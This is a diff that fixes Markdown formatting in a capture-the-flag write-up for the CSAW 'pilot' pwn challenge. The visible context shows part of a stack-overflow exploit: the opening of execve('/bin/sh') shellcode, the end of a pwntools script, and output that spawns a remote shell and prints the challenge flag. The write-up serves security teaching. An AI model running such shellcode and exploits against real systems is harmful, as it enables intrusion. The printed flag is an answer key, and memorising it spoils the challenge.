@@ -1,10 +1,11 @@
-#Description
+# Description
 The pilot challenge was part of the pwn category, there was a binary available to download and the only
 information we got was this:
-
+```
 Can I take your order?
 
 nc pwn.chal.csaw.io 8464
+```
 
 # Running the binary
 First of all we will run the binary to check if there is some sort for information that can help us to
@@ -160,7 +161,7 @@ Since there is no NX protection to prevent the execution of code in the stack we
 directly to the stack and modify the ret address in order to jump there, since we just want to spawn a shell
 in the remote server we will use the following code in ASM to generate our shellcode that is just sysexecv("/bin/sh",0,0):
 
-``asm
+```asm
 bits 64
 
 push 59
@@ -209,6 +210,7 @@ print "[+] Entering interactive mode\n"
 r.interactive()
 ```
 # Getting the flag
+```
 foobar@quant:~/h/c/csaw$ python exploit.py 
 [+] Opening connection to pwn.chal.csaw.io on port 8464: Done
 [+] Getting memory leak
@@ -223,3 +225,4 @@ flag
 pilot
 $ cat flag
 flag{1nput_c00rd1nat3s_Strap_y0urse1v3s_1n_b0ys}
+```
